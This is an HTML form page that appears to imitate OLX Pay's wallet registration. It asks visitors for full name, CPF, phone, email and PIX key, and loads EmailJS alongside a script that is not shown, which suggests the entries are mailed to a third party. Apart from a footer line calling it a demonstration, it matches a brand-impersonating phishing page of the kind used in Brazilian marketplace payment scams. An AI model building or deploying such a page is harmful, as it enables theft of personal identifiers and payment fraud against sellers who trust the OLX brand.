<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>OLX PAY – Cadastro de Carteira</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <main class="card">
    <img src="./assets/images/illustration.png" class="hero-img" alt="Ilustração">

    <h1>Cadastro de Carteira <span>OLX PAY</span></h1>
    <p class="subtitle">
      Complete seus dados para configurar sua forma de recebimento.
    </p>

    <form id="formDados" novalidate>

      <label>Nome completo*
        <input type="text" name="nome" required>
      </label>

      <label>CPF*
        <input type="text" name="cpf" required>
      </label>

      <label>Telefone*
        <input type="tel" name="telefone" required>
      </label>

      <label>E-mail*
        <input type="email" name="email" required>
      </label>

      <fieldset>
        <legend>Como deseja receber PIX*</legend>
        <label><input type="checkbox" name="pixTipo" value="CPF"> CPF</label>
        <label><input type="checkbox" name="pixTipo" value="Email"> E-mail</label>
        <label><input type="checkbox" name="pixTipo" value="Telefone"> Telefone</label>
        <label><input type="checkbox" name="pixTipo" value="Aleatoria"> Chave Aleatória</label>
      </fieldset>

      <label>Digite sua chave PIX*
        <input type="text" name="pixChave" required>
      </label>

      <button type="submit">RECEBER</button>
    </form>

    <footer>
      <p class="copy">
        © 2026 OLX PAY – Plataforma demonstrativa
      </p>
    </footer>
  </main>

  <!-- EmailJS CDN -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <!-- Seu JS -->
  <script src="js/script.js"></script>

</body>
</html>
